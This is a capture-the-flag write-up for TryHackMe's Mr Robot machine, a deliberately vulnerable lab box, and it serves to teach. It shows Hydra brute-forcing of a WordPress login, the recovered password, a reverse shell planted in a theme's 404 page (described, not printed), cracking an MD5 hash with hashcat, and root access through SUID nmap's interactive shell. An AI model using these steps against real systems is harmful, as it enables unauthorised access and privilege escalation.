---
title: MR_Robot_CTF
date: 2023-08-22 16:26:16 +0800
categories: [Tryhackme, medium]
tags: [thm, ctf, pentesting, web, unix, prev-esc]
---


## MR_Robot_CTF is a capture the flag medium machine on Tryhackme



Nmap scan 

```shell

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).


```

found this in`/feed/atom`

```txt
<?xml version="1.0" encoding="UTF-8"?><feed
  xmlns="http://www.w3.org/2005/Atom"
  xmlns:thr="http://purl.org/syndication/thread/1.0"
  xml:lang="en-US"
  xml:base="http://10.10.233.36/wp-atom.php"
   >
	<title type="text">user&#039;s Blog!</title>
	<subtitle type="text">Just another WordPress site</subtitle>

	<updated></updated>

	<link rel="alternate" type="text/html" href="http://10.10.233.36" />
	<id>http://10.10.233.36/feed/atom/</id>
	<link rel="self" type="application/atom+xml" href="http://10.10.233.36/feed/atom/" />

	<generator uri="http://wordpress.org/" version="4.3.1">WordPress</generator>
</feed>

```

*Nikto* scan

```shell 

+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://mrobot.thm/?p=23>; rel=shortlink
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-12-20 10:34:05 (GMT1) (2242 seconds)

```

found a file that containing first key in `robots.txt`


*Gobuster*

```shell
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://mrobot.thm/0/]
/Image                (Status: 301) [Size: 0] [--> http://mrobot.thm/Image/]
/admin                (Status: 301) [Size: 232] [--> http://mrobot.thm/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://mrobot.thm/feed/atom/]
/audio                (Status: 301) [Size: 232] [--> http://mrobot.thm/audio/]
/blog                 (Status: 301) [Size: 231] [--> http://mrobot.thm/blog/]
/css                  (Status: 301) [Size: 230] [--> http://mrobot.thm/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://mrobot.thm/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://mrobot.thm/feed/]
/images               (Status: 301) [Size: 233] [--> http://mrobot.thm/images/]
/image                (Status: 301) [Size: 0] [--> http://mrobot.thm/image/]
/index.html           (Status: 200) [Size: 1077]
/index.php            (Status: 301) [Size: 0] [--> http://mrobot.thm/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 229] [--> http://mrobot.thm/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://mrobot.thm/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://mrobot.thm/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> http://mrobot.thm/feed/rdf/]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://mrobot.thm/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://mrobot.thm/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://mrobot.thm/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 232] [--> http://mrobot.thm/video/]
/wp-admin             (Status: 301) [Size: 235] [--> http://mrobot.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 237] [--> http://mrobot.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 238] [--> http://mrobot.thm/wp-includes/]
/wp-cron              (Status: 200) [Size: 0]
/wp-config            (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2650]
/wp-mail              (Status: 500) [Size: 3064]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://mrobot.thm/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc               (Status: 405) [Size: 42]


```

*wpscan*

```shell
[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://mrobot.thm/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://mrobot.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://mrobot.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://mrobot.thm/5011e91.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://mrobot.thm/5011e91.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://mrobot.thm/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://mrobot.thm/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://mrobot.thm/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://mrobot.thm/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

```

I found a tow files in `robots.txt` 
	`fsocity.dic` contains a usernames wordlist
	`key-1-of-3.txt` contains first flag


Now I have usernames wordlist and a `wp-login.php` that I found using *gobuster* look above
using *Hydra* I brute forced usernames and I got this result:

```shell
hydra -L fsocity.dic -p pass mrobot.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 20

[80][http-post-form] host: mrobot.thm   login: `Elliot`   password: pass

```

Now it's time to brute force password


```shell
hydra -l Elliot -P fsocity.dic  mrobot.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 40

ER28-0652

```

Once I looged in 
I found and editor for twentyfiften theme and I added `pentesterMonky` reverseshell to 404 page

then I navigate to a non-exist page and *BooM* I got shell

I found an md5 password
and non permitted 2nd flag 

Using *hashcat* I cracked the hash and got password

```shell
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

```
Now I logged in as robot
and got 2nd flag


found *namp*  `SUID` bit set using up-coming commands I got a root

```shell 

find / -type f -perm -4000 2>/dev/null
..
...
/bin/nmap
...
..
nmap --interactive

namp> !sh

whoami
root
```
and I got the last flag in /root

thank's for reading